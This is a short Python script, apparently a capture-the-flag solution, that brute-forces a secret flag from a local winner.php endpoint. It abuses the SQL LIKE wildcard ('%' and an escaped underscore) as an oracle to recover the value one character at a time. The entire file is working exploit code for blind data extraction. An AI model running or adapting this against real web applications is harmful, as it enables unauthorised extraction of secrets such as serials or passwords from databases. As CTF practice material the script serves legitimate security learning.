import requests

HOST = "127.0.0.1"

alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}-_1234567890"
url = f"http://{HOST}/winner.php?serial="
flag = "JDHACK"
i = 0

def nextchar() :
    global flag, alphabet

    for i in alphabet:
        if (i == '_'):
            i = "\\_"
        # Exploit the SQL LIKE request using %
        response = requests.get(url + flag + i + "%25")
        message = response.json()["message"]

        if "Félicitations" in message:
            flag += i
            if i == "\\_" :
                print("_", end="", flush=True)
            else :
                print(i, end="", flush=True)
            return 0
    return 1

print(flag, end="", flush=True)
while 1:
    if nextchar() == 1 :
        print("\nDone.")
        break

